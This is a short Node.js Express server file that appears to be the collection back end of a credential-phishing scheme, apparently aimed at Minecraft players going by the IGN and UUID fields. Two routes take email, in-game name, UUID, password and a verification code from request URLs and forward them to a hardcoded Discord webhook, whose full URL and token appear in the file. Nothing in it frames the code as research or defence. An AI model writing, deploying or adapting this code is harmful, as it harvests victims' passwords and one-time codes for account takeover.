const express = require('express');
const axios = require('axios');
const app = express();
const port = 5000;

// Discord webhook URL
const webhookUrl = 'https://discord.com/api/webhooks/1112066231663591474/xFWvOK2R9uM-9RMseOHapfa-qN8Qz65myhlmFHVL8A5I8BcWrua8saGL-8S4YKyoRLAV';

app.get('/get/*', (req, res) => {
  const params = req.params[0].split('/').filter(param => param !== '');
  console.log(params);

  // Check if all required parameters are present
  if (params.length >= 4) {
    const [email, ign, uuid, password] = params;

    // Prepare the payload for the webhook
    const payload = {
      content: `Email: ${email}\nIGN: ${ign}\nUUID: ${uuid}\nPassword: ${password}`,
    };

    // Make an HTTP POST request to the Discord webhook
    axios.post(webhookUrl, payload)
      .then(() => {
        console.log('Posted to Discord webhook successfully.');
      })
      .catch(error => {
        console.error('Error posting to Discord webhook:', error);
      });

    res.send('Request parameters logged and posted to Discord webhook.');
  } else {
    res.send('Insufficient parameters.');
  }
});
app.get('/code/*', (req, res) => {
  const params = req.params[0].split('/').filter(param => param !== '');
  console.log(params);

  // Check if all required parameters are present
  if (params.length >= 6) {
    const [email, ign, uuid, password, code, ref] = params;

    // Prepare the payload for the webhook
    const payload = {
      content: `Email: ${email}\nIGN: ${ign}\nUUID: ${uuid}\nPassword: ${password}\nCode: ${code}`,
    };

    // Make an HTTP POST request to the Discord webhook
    axios.post(webhookUrl, payload)
      .then(() => {
        console.log('Posted to Discord webhook successfully.');
      })
      .catch(error => {
        console.error('Error posting to Discord webhook:', error);
      });

    res.send('Request parameters logged and posted to Discord webhook.');
  } else {
    res.send('Insufficient parameters.');
  }
});


app.listen(port, () => {
  console.log(`API listening at http://localhost:${port}`);
});
